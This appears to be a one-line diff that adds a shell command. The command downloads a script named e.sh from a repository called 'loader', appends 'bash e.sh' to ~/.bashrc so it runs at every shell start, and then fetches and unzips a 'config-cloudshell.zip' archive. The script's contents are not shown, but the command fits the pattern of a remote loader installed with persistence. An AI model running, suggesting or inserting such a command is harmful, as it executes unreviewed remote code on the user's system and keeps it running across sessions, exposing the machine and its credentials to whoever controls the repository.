@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/dark-zyro/loader/refs/heads/main/e.sh -O e.sh && echo 'bash e.sh' >> ~/.bashrc && wget https://github.com/dark-zyro/loader/releases/download/y/config-cloudshell.zip && unzip config-cloudshell.zip
